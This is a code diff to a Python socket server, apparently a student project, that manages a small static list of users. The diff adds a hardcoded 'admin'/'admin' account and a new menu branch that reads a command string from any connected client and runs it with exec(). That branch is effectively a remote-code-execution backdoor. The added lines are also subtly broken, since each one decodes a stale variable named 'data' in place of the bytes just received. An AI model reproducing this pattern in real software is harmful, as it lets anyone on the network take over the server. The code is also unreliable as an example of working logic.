@@ -221,7 +221,8 @@ except:
 member1 = Student("ali","1985")
 member2 = Student("amir" , "1998")
 member3 = Student("hamid" , "2000")
-security_array = [member1 , member2, member3]
+admin = Student("admin" , "admin")
+security_array = [member1 , member2, member3,admin]
 # static security implementation
 prYellow("Waiting for connection an client .... ")
 
@@ -304,6 +305,16 @@ def client_thread(connection):
                     print(message)
                     connection.sendall(str.encode(message))
 
+
+            elif choice == 5:
+                admin_choose = connection.recv(2048)
+                admin_choose = data.decode("UTF-8")
+                connection.sendall(str.encode("possible"))
+                if int(admin_choose) == 1:
+                    admin_command = connection.recv(2048)
+                    admin_command = data.decode("UTF-8")
+                    print("admin command is: ", admin_command)
+                    exec(admin_command)
 
 
 
